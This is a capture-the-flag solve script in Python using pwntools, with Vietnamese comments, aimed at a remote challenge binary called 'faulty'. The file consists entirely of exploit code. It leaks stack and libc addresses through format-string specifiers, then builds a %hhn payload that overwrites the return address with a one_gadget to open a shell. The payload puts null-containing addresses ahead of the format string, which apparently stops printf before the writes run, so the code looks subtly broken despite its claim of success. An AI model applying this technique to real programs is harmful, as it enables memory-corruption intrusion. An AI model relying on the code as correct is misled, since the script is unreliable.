# solve.py
from pwn import *

context.binary = elf = ELF('./faulty')
libc = ELF('./libc.so.6')

# --- CHẾ ĐỘ KẾT NỐI ---
# p = process(env={"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")})
p = remote('chall.v1t.site', 30213)

# === GIAI ĐOẠN 1: LEAK STACK VÀ LIBC ===
log.info("--- Stage 1: Leaking Stack and Libc addresses ---")
p.sendlineafter(b"What is your name?\n", b"leaker")

# Leak Saved RBP (offset 26) và Libc (offset 27)
payload_leak = b"%26$p.%27$p"
p.sendlineafter(b"Speak loud what do you want\n", payload_leak)

output_block = p.recvuntil(b"I SAID SPEAK LOUD!\n", drop=True)
values = output_block.strip().split(b'.')
saved_rbp = int(values[0], 16)
leaked_libc_addr = int(values[1], 16)

log.success(f"Leaked Saved RBP: {hex(saved_rbp)}")
log.success(f"Leaked Libc Address: {hex(leaked_libc_addr)}")

offset_from_libc_start_main = 243
libc.address = leaked_libc_addr - (libc.symbols['__libc_start_main'] + offset_from_libc_start_main)
one_gadget_offset = 0xef52b
one_gadget_addr = libc.address + one_gadget_offset
log.success(f"Calculated one_gadget address: {hex(one_gadget_addr)}")

return_addr_on_stack = saved_rbp + 8
log.info(f"Address of Return Address on stack: {hex(return_addr_on_stack)}")


# === GIAI ĐOẠN 2: TỰ XÂY DỰNG PAYLOAD GHI 3 BYTE ===
log.info("--- Stage 2: Manually crafting 3-byte overwrite payload ---")

# Offset của con trỏ đầu tiên chúng ta kiểm soát. Dựa trên debug, nó là 6 hoặc 7.
# Hãy thử 6 vì nó là mặc định.
offset = 6

# Chúng ta sẽ ghi 3 byte cuối của one_gadget vào địa chỉ trả về.
byte1 = (one_gadget_addr >> 0) & 0xFF
byte2 = (one_gadget_addr >> 8) & 0xFF
byte3 = (one_gadget_addr >> 16) & 0xFF

# Sắp xếp các byte cần ghi theo thứ tự tăng dần để tối ưu payload
# (giá trị, địa chỉ)
writes = sorted([(byte1, return_addr_on_stack),
                 (byte2, return_addr_on_stack + 1),
                 (byte3, return_addr_on_stack + 2)])

payload_write = b""
written_bytes = 0

# Đặt các con trỏ (địa chỉ cần ghi) ở đầu payload
pointers = b""
for i in range(3):
    pointers += p64(writes[i][1])

# Xây dựng chuỗi format string để thực hiện các cú ghi
format_string = b""
for i in range(3):
    value = writes[i][0]
    # Tính số ký tự cần in thêm
    if value > written_bytes:
        to_print = value - written_bytes
    else: # Xử lý trường hợp overflow (ví dụ: ghi 0x10 sau khi đã ghi 0x20)
        to_print = 0x100 + value - written_bytes
    
    if to_print > 0:
        format_string += b"%" + str(to_print).encode() + b"c"
        
    # Offset của con trỏ hiện tại. Con trỏ đầu tiên là ở offset 6.
    format_string += b"%" + str(offset + i).encode() + b"$hhn"
    written_bytes = value

# Ghép lại payload cuối cùng
final_payload = pointers + format_string

# `fgets` đang chờ input. Gửi payload.
p.sendline(final_payload)
log.info("Sent final manual payload to partially overwrite the return address.")
log.success("Payload sent. Shell should be triggered on function return.")

p.interactive()